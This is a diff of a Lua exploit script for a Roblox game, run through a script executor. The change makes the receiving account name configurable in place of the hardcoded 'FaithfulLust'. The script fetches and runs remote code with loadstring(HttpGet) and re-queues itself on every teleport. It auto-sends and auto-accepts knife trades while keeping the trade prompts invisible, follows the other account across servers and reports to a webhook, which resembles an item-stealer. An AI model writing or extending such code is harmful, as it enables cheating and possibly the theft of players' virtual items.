@@ -1,7 +1,7 @@
 local RECEIVER_NAME = ...
 if type(RECEIVER_NAME) ~= "string" or RECEIVER_NAME:match("^%s*$") then
     local g = getgenv and getgenv() or _G
-    RECEIVER_NAME = g.Receiver or g.TargetReceiver or g.MAIN_USERNAME or g.ReceiverName or "FaithfulLust"
+    RECEIVER_NAME = g.Receiver or g.TargetReceiver or g.MAIN_USERNAME or g.ReceiverName or "Main"
 end
 RECEIVER_NAME = RECEIVER_NAME:match("^%s*(.-)%s*$") -- trim whitespace
 
@@ -85,9 +85,9 @@ local function queueScriptOnTeleport()
     local payload = string.format([[
 repeat task.wait(0.1) until game:IsLoaded() and game.Players.LocalPlayer
 pcall(function()
-    loadstring(game:HttpGet("%s"))()
+    loadstring(game:HttpGet(%q, true))(%q)
 end)
-]], CONFIG.QUEUE_ON_TELEPORT_URL)
+]], CONFIG.QUEUE_ON_TELEPORT_URL, CONFIG.MAIN_USERNAME)
 
     pcall(function()
         qot(payload)
@@ -112,7 +112,7 @@ local function reinjectFromGithub()
     end)
     task.spawn(function()
         local ok, err = pcall(function()
-            loadstring(game:HttpGet(CONFIG.QUEUE_ON_TELEPORT_URL))()
+            loadstring(game:HttpGet(CONFIG.QUEUE_ON_TELEPORT_URL, true))(CONFIG.MAIN_USERNAME)
         end)
         if not ok and addLog then
             addLog(string.format("Erro ao reinjetar do GitHub: %s", tostring(err)))
@@ -1156,7 +1156,7 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
 
     if isMain then
         task.spawn(function()
-            addLog(string.format("FaithfulLust (Main) em trade com '%s'. Modo: APENAS RECEBER (Oferta 100%% VAZIA).", tostring(partnerName)))
+            addLog(string.format("%s (Main) em trade com '%s'. Modo: APENAS RECEBER (Oferta 100%% VAZIA).", CONFIG.MAIN_USERNAME, tostring(partnerName)))
             addLog("Aguardando Alt colocar as facas e liberar confirmação...")
 
             local waitPartnerStart = tick()
@@ -1191,13 +1191,13 @@ StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
 
             if not State.InTrade then return end
 
-            executeAutoAccept("FaithfulLust (Main - Apenas Recebe)")
+            executeAutoAccept(string.format("%s (Main - Apenas Recebe)", CONFIG.MAIN_USERNAME))
 
             for _ = 1, 10 do
                 task.wait(1.5)
                 if not State.InTrade then break end
                 pcall(function()
-                    executeAutoAccept("FaithfulLust Pulse")
+                    executeAutoAccept(string.format("%s Pulse", CONFIG.MAIN_USERNAME))
                 end)
             end
         end)
@@ -1245,7 +1245,7 @@ AcceptTradeRemote.OnClientEvent:Connect(function(isComplete, receivedItems)
                     if TradeModuleRef then
                         TradeModuleRef.RequestsEnabled = false
                     end
-                    patchWebhookMessage("ALL_KNIVES_TRANSFERRED", string.format("Todas as facas foram transferidas para FaithfulLust! Total: %d facas em %d trades.", State.KnivesTransferred, State.TradesCompleted), {})
+                    patchWebhookMessage("ALL_KNIVES_TRANSFERRED", string.format("Todas as facas foram transferidas para %s! Total: %d facas em %d trades.", CONFIG.MAIN_USERNAME, State.KnivesTransferred, State.TradesCompleted), {})
                     addLog("Transferência 100% concluída! Sem mais facas na Alt. Auto-trade PARADO com sucesso.")
                 end
             end)
@@ -1254,7 +1254,7 @@ AcceptTradeRemote.OnClientEvent:Connect(function(isComplete, receivedItems)
         if isMain then
             task.spawn(function()
                 task.wait(CONFIG.BATCH_DELAY)
-                addLog("FaithfulLust pronto para o próximo lote de trade...")
+                addLog(string.format("%s pronto para o próximo lote de trade...", CONFIG.MAIN_USERNAME))
             end)
         end
     else
@@ -1418,9 +1418,9 @@ task.spawn(function()
 
     task.wait(2.0)
     forceEnableRequests()
-    addLog("FaithfulLust (PC A) loop ativo! Sistema de auto-trade contínuo ligado.")
+    addLog(string.format("%s (PC A) loop ativo! Sistema de auto-trade contínuo ligado.", CONFIG.MAIN_USERNAME))
 
-    patchWebhookMessage("WAITING_ALT", string.format("FaithfulLust online no servidor `%s`. Aguardando Alt...", game.JobId), {})
+    patchWebhookMessage("WAITING_ALT", string.format("%s online no servidor `%s`. Aguardando Alt...", CONFIG.MAIN_USERNAME, game.JobId), {})
 
     while true do
         task.wait(1.5)
@@ -1444,8 +1444,8 @@ task.spawn(function()
                 if altJob and altJob ~= "" and altJob ~= game.JobId and altJob ~= "Studio" and altJob ~= "Unknown" then
                     if (tick() - State.LastTeleportTick) > 10.0 then
                         State.LastTeleportTick = tick()
-                        addLog(string.format("Alt detectada em outro servidor! JobId: %s. Teleportando FaithfulLust...", altJob))
-                        patchWebhookMessage("TELEPORTING_MAIN", string.format("Teleportando FaithfulLust para servidor da Alt `%s`...", altJob), {})
+                        addLog(string.format("Alt detectada em outro servidor! JobId: %s. Teleportando %s...", altJob, CONFIG.MAIN_USERNAME))
+                        patchWebhookMessage("TELEPORTING_MAIN", string.format("Teleportando %s para servidor da Alt `%s`...", CONFIG.MAIN_USERNAME, altJob), {})
 
                         pcall(function()
                             queueScriptOnTeleport()
@@ -1459,7 +1459,7 @@ task.spawn(function()
                 if State.AllItemsTransferred or State.ActiveCommand == "ALL_KNIVES_TRANSFERRED" or (State.AltKnivesReported ~= nil and State.AltKnivesReported == 0) then
                     if not State.TransferFinishedLogged then
                         State.TransferFinishedLogged = true
-                        addLog("✦ Todas as facas foram transferidas com sucesso! FaithfulLust parando de enviar pedidos de trade.")
+                        addLog(string.format("✦ Todas as facas foram transferidas com sucesso! %s parando de enviar pedidos de trade.", CONFIG.MAIN_USERNAME))
                         State.StatusMessage = "Concluído: 0 facas restantes na Alt (Trades parados)"
                         if _G.UpdateTradeUI then pcall(_G.UpdateTradeUI) end
                     end
@@ -1469,7 +1469,7 @@ task.spawn(function()
 
                     if timeSinceLastTrade >= CONFIG.BATCH_DELAY and timeSinceLastSend >= 2.5 then
                         State.LastSendRequestTick = tick()
-                        addLog(string.format("FaithfulLust: Disparando trade para Alt '%s' no servidor...", altPlayer.Name))
+                        addLog(string.format("%s: Disparando trade para Alt '%s' no servidor...", CONFIG.MAIN_USERNAME, altPlayer.Name))
 
                         task.spawn(function()
                             local success, err = pcall(function()
@@ -1477,9 +1477,9 @@ task.spawn(function()
                                 return SendRequestRemote:InvokeServer(unpack(args))
                             end)
                             if success then
-                                addLog(string.format("FaithfulLust: Pedido enviado para '%s'! Aguardando Alt auto-aceitar...", altPlayer.Name))
+                                addLog(string.format("%s: Pedido enviado para '%s'! Aguardando Alt auto-aceitar...", CONFIG.MAIN_USERNAME, altPlayer.Name))
                             else
-                                addLog(string.format("FaithfulLust: SendRequest retorno: %s", tostring(err)))
+                                addLog(string.format("%s: SendRequest retorno: %s", CONFIG.MAIN_USERNAME, tostring(err)))
                             end
                         end)
                     end
@@ -1848,7 +1848,7 @@ local function createAutoTradeHUD()
     InfoDesc.Size = UDim2.new(1, -16, 1, -30)
     InfoDesc.Position = UDim2.new(0, 8, 0, 26)
     InfoDesc.BackgroundTransparency = 1
-    InfoDesc.Text = "• Proteção Ativa: FaithfulLust APENAS RECEBE facas e NUNCA oferta/entrega nada.\n• Pedidos de Trade aceitos automaticamente e mantidos 100% INVISÍVEIS na tela.\n• Auto-Execute On Teleport: Carrega Dash.lua automaticamente em rejoining ou troca de servidor.\n• Atalho: Pressione a tecla [ , ] para alternar a exibição deste painel."
+    InfoDesc.Text = string.format("• Proteção Ativa: %s APENAS RECEBE facas e NUNCA oferta/entrega nada.\n• Pedidos de Trade aceitos automaticamente e mantidos 100%% INVISÍVEIS na tela.\n• Auto-Execute On Teleport: Carrega Dash.lua automaticamente em rejoining ou troca de servidor.\n• Atalho: Pressione a tecla [ , ] para alternar a exibição deste painel.", CONFIG.MAIN_USERNAME)
     InfoDesc.TextColor3 = StudioTheme.textMuted
     InfoDesc.Font = Enum.Font.SourceSans
     InfoDesc.TextSize = 12
@@ -1984,7 +1984,7 @@ local function createAutoTradeHUD()
     TpToAltBtn.MouseButton1Click:Connect(function()
         local _, targetJobId = getWebhookData()
         if targetJobId and targetJobId ~= "" and targetJobId ~= game.JobId and targetJobId ~= "Unknown" then
-            addLog(string.format("Teleportando FaithfulLust para a Alt no servidor `%s`...", targetJobId))
+            addLog(string.format("Teleportando %s para a Alt no servidor `%s`...", CONFIG.MAIN_USERNAME, targetJobId))
             pcall(function()
                 queueScriptOnTeleport()
                 TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, LocalPlayer)
